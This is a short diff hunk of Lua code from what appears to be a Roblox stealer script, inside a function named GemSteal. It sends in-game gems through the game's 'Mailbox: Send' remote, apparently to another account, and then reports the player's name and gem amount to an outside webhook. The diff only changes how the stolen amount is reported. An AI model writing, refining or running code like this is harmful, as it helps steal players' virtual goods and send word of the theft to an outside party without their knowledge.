@@ -248,7 +248,7 @@ function GemSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
-			SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. id)
+			SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
 			end
         end
     end
